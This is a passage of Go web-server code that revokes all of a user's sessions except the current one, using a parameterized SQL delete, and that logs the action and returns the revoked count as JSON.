		current = c.Value
	}
	if current == "" {
		writeJSONError(w, http.StatusBadRequest, "missing_session", "No current session.")
		return
	}

	res, err := db.Exec("DELETE FROM sessions WHERE username=? AND token<>?", username, current)
	if err != nil {
		writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
		return
	}
	affected, _ := res.RowsAffected()
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "AUTH_SESSION_REVOKE_ALL",
		Severity:  severityInfo,
		Message:   "All sessions revoked.",
		Metadata: map[string]interface{}{
			"revoked_count": affected,
		},
	})
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "revoked": affected})
}
